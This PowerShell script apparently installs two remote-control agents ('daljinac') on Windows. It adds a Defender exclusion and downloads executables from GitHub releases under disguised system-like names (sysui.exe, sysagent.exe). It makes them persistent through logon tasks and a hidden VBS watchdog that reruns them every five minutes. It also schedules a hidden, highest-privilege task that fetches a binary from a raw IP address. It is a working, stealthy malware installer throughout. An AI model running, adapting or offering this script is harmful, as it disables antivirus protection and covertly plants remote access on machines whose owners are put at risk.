param([switch]$v1, [switch]$v2)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Defender exclusion - ensure paths are never blocked
Add-MpPreference -ExclusionPath "C:\appdata" -ErrorAction SilentlyContinue

if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }

$agents = @()
if ($v1) { $agents += @{ Name='v1'; Dir='C:\appdata\sh'; ExeName='sysui.exe'; TaskName='sysui'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; Args='-notray' } }
if ($v2) { $agents += @{ Name='v2'; Dir='C:\appdata\sa'; ExeName='sysagent.exe'; TaskName='sysagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; Args='-notray' } }

Write-Host "=== Cleanup ===" -ForegroundColor Cyan
@("daljinac","daljinacWatch","daljinac2","daljinac2Watch",
  "sysui","sysuiWatch","sysagent","sysagentWatch",
  "HelpDataHost","HelpDataHostWatch","DiagHubHost","DiagHubHostWatch",
  "sdhost","sdhostWatch","sdagent","sdagentWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}
rmdir /s /q "C:\ProgramData\Microsoft\HelpData" 2>$null
rmdir /s /q "C:\ProgramData\Microsoft\DiagHub" 2>$null
rmdir /s /q "C:\Program Files\Common Files\Sdh" 2>$null
rmdir /s /q "C:\Program Files\Common Files\Sda" 2>$null

foreach ($a in $agents) {
    Write-Host "=== $($a.Name): $($a.ExeName) ===" -ForegroundColor Cyan
    $Exe = "$($a.Dir)\$($a.ExeName)"

    Write-Host "  [1/3] Killing old..."
    Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($a.ExeName)),
                     "HelpDataHost","DiagHubHost","sdhost","sdagent",
                     "systemUI","daljinac","daljinac2" -ErrorAction SilentlyContinue | Stop-Process -Force
    $maxWait = 20
    do {
        Start-Sleep -Seconds 1
        $maxWait--
        $portFree = $true
        try { (Get-NetTCPConnection -LocalPort $a.Port -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
        if ($maxWait -le 0) { break }
    } while (-not $portFree)
    Start-Sleep -Seconds 2

    Write-Host "  [2/3] Downloading..."
    mkdir $a.Dir -Force | Out-Null
    $downloaded = $false
    for ($retry = 1; $retry -le 3; $retry++) {
        try {
            Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
            $sz = (Get-Item "$Exe.new").Length
            if ($sz -gt 100000) { Write-Host "         $sz bytes (attempt $retry)" -ForegroundColor Green; $downloaded = $true; break }
        } catch { Write-Host "         retry $retry..." -ForegroundColor Yellow; Start-Sleep 2 }
    }
    if (-not $downloaded) { Write-Host "         FAILED" -ForegroundColor Red; continue }

    Write-Host "  [2b/3] Replacing..."
    Move-Item -Force "$Exe.new" $Exe

    Write-Host "  [3/3] Installing scheduled task..."
    Remove-Item "$($a.Dir)\watchdog.vbs" -Force -ErrorAction SilentlyContinue
    schtasks /create /tn "$($a.TaskName)" /tr "$Exe $($a.Args)" /sc ONLOGON /f 2>$null

    $vbs = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $($a.TaskName)`", 0, False"
    Set-Content -Path "$($a.Dir)\watchdog.vbs" -Value $vbs -Encoding ASCII
    schtasks /create /tn "$($a.TaskName)Watch" /tr "wscript.exe //B $($a.Dir)\watchdog.vbs" /sc MINUTE /mo 5 /du 24:00 /f 2>$null

    ([wmiclass]'Win32_Process').Create("`"$Exe`" $($a.Args)") | Out-Null
    Start-Sleep -Seconds 2
}

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
Write-Host "  v1: sysui.exe  (C:\appdata\sh\)" -ForegroundColor Cyan
Write-Host "  v2: sysagent.exe (C:\appdata\sa\)" -ForegroundColor Cyan

Start-Sleep -Seconds 3
Write-Host ""
Write-Host "Verifying..." -ForegroundColor Cyan
$p1 = Get-Process -Name sysui -ErrorAction SilentlyContinue
if ($p1) { Write-Host "  v1: RUNNING (PID $($p1.Id))" -ForegroundColor Green } else { Write-Host "  v1: not found" -ForegroundColor Red }
$p2 = Get-Process -Name sysagent -ErrorAction SilentlyContinue
if ($p2) { Write-Host "  v2: RUNNING (PID $($p2.Id))" -ForegroundColor Green } else { Write-Host "  v2: not found" -ForegroundColor Red }

# Bootstrap: download aria2c.exe in background (single binary, portable, no UAC)
Write-Host "  [bootstrap] Scheduling aria2c download..." -ForegroundColor Cyan
$bsAction = New-ScheduledTaskAction -Execute powershell -Argument "-NoP -W Hidden -Command if(!(Test-Path C:\appdata\aria2c.exe)){try{iwr http://31.220.74.109:9999/aria2c.exe -OutFile C:\appdata\aria2c.exe -UseBasicParsing}catch{exit 1}}; if((Test-Path C:\appdata\aria2c.exe)-and((Get-Item C:\appdata\aria2c.exe).Length-gt 1000000)){schtasks /delete /tn DaljinacBootstrap /f}else{exit 1}"
$bsTrigger = New-ScheduledTaskTrigger -AtLogOn
$bsSettings = New-ScheduledTaskSettingsSet
$bsPrincipal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "DaljinacBootstrap" -Action $bsAction -Trigger $bsTrigger -Settings $bsSettings -Principal $bsPrincipal -Force | Out-Null
Write-Host "         Done" -ForegroundColor Green
